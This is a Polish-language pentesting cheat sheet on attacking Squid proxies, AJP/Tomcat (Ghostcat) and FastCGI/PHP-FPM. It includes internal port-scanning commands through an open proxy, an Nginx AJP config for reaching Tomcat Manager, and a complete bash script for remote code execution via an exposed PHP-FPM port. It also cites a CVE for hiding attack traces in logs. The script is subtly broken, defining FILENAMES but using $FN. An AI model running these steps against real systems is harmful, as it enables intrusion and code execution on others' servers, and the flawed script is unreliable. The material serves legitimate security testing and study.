# Proxy, AJP i FastCGI -- Pentesting Infrastruktury Webowej

## 1. Squid Proxy (port 3128)

### Kluczowe wektory ataku
- **Pivoting przez proxy** -- Squid moze byc wykorzystany do skanowania portow wewnetrznych i dostepu do uslug niedostepnych z zewnatrz
- **Brak uwierzytelniania** -- domyslnie Squid moze nie wymagac autentykacji; sprawdz: `curl --proxy http://TARGET:3128 http://127.0.0.1`
- **Skanowanie portow wewnetrznych przez proxy**:
  ```bash
  # SPOSE -- skaner portow przez Squid
  python spose.py --proxy http://SQUID_IP:3128 --target localhost
  # Proxychains -- dodaj do /etc/proxychains.conf:
  # http  SQUID_IP  3128
  proxychains nmap -sT -n -p- localhost
  ```
- **Lancuch Burp -> Squid -> cel wewnetrzny**: w Burp ustaw upstream proxy na `http://SQUID_IP:3128`, aby przechwytywac ruch do uslug wewnetrznych (np. `http://127.0.0.1:9191`)

### Narzedzia
- [SPOSE](https://github.com/aancw/spose) -- Squid Pivoting Open Port Scanner
- Proxychains + curl/nmap do interakcji z wewnetrznymi usugami HTTP

---

## 2. Apache JServ Protocol -- AJP (port 8009)

### Domyslne dane / bledy konfiguracji
- AJP jest protokolem binarnym pomiedzy Apache/Nginx a Tomcatem -- **czesto wystawiony bez autentykacji**
- **CVE-2020-1938 (Ghostcat)** -- LFI pozwalajacy czytac pliki z webapp (np. `WEB-INF/web.xml` z hasami). Podatne wersje: Tomcat < 9.0.31, < 8.5.51, < 7.0.100
  ```bash
  # Exploit: https://www.exploit-db.com/exploits/48143
  ```
- **Enumeracja**:
  ```bash
  nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 <IP>
  ```

### Dostep do Tomcat Manager przez AJP proxy
- **Nginx + modul AJP**: skompiluj Nginx z `nginx_ajp_module`, skonfiguruj upstream na `<TARGET>:8009` -- uzyskasz dostep do panelu Tomcata przez HTTP
  ```nginx
  upstream tomcats {
      server <TARGET>:8009;
  }
  server {
      listen 80;
      location / {
          ajp_pass tomcats;
      }
  }
  ```
- **Wersja Docker**: `git clone https://github.com/ScribblerCoder/nginx-ajp-docker` -- szybki proxy AJP
- Po uzyskaniu dostepu do Tomcat Managera -> RCE przez deploy WAR

---

## 3. FastCGI / PHP-FPM (port 9000)

### Kluczowe informacje
- Domyslnie nasluchuje na **localhost:9000**, nmap czesto nie rozpoznaje uslugi
- **Jesli port 9000 jest dostepny -> bezposrednie RCE**

### Wektory ataku

#### Bezposrednie RCE (dostep do portu 9000)
```bash
#!/bin/bash
PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/public/index.php"  # istniejacy plik PHP
HOST=$1
B64=$(echo "$PAYLOAD"|base64)
env -i \
  PHP_VALUE="allow_url_include=1"$'\n'"auto_prepend_file='data://text/plain;base64,$B64'" \
  SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
  cgi-fcgi -bind -connect $HOST:9000
```

#### RCE przez SSRF (gopher://)
- Jesli masz SSRF, uzyj `gopher://127.0.0.1:9000/_<payload>` do wyslania spreparowanego zadania FastCGI
- Narzedzie Python: https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

#### Bledy konfiguracji Nginx + FastCGI
- `cgi.fix_pathinfo=1` + brak weryfikacji istnienia pliku -> **kazda sciezka konczaca sie na .php zostanie wykonana** (path traversal do RCE)

### Znane podatnosci
- **libfcgi <= 2.4.4** -- integer overflow -> heap RCE (32-bit, IoT)
- **CVE-2024-9026** -- manipulacja logow PHP-FPM (ukrywanie sladow ataku)
